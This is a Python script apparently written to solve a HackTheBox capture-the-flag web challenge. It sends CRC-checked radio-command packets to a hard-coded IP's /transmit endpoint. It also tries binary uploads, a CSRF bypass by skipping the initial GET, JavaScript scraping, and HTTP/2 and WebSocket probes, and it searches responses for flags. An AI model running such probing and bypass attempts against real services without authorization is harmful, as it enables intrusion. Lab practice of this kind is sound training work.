#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 83: ¿Y si necesito enviar datos en formato binary?
print("[*] INNOVACIÓN 83: Datos binarios directos")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xA1, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet_bytes = data + struct.pack('<H', crc)
    
    # Enviar como binary
    r = s.post(f'{base_url}/transmit', files={'data': packet_bytes})
    print(f"  Binary upload status: {r.status_code}")

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 84: Revisar JavaScript en busca de validación o lógica
print("\n[*] INNOVACIÓN 84: Analizar JavaScript de la página")
r = s.get(base_url)

# Buscar funciones de validación
js_code = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
for i, js in enumerate(js_code):
    if 'function' in js or 'var' in js:
        print(f"\n[JS Block {i}]")
        print(js[:300])
        
        # Buscar validaciones o condiciones
        if 'valid' in js.lower() or 'check' in js.lower() or 'flag' in js.lower():
            print("[!] Interesting JS block!")

# INNOVACIÓN 85: Intentar bypass CSRF
print("\n[*] INNOVACIÓN 85: CSRF bypass")
s2 = requests.Session()
# No hacer GET inicial, ir directo a POST
data = bytes([0xE1, 0xFF])
crc = crc16(data)
packet = (data + struct.pack('<H', crc)).hex().upper()

r = s2.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': packet
})
print(f"Direct POST without GET: {r.status_code}")

# INNOVACIÓN 86: Probar con HTTP/2
print("\n[*] INNOVACIÓN 86: Usando requests con HTTP/2 si está disponible")
try:
    import httpx
    client = httpx.Client(http2=True)
    r = client.get(base_url)
    print(f"HTTP version: {r.http_version}")
except ImportError:
    print("[-] httpx not available")
except Exception as e:
    print(f"[-] Error: {e}")

# INNOVACIÓN 87: WebSocket connection
print("\n[*] INNOVACIÓN 87: Buscar WebSocket")
# Buscar en el HTML si hay WebSocket
if 'websocket' in r.text.lower() or 'ws://' in r.text.lower():
    print("[+] WebSocket found in page!")
else:
    print("[-] No WebSocket detected")

print("\n[*] Innovaciones 83-87 completadas")
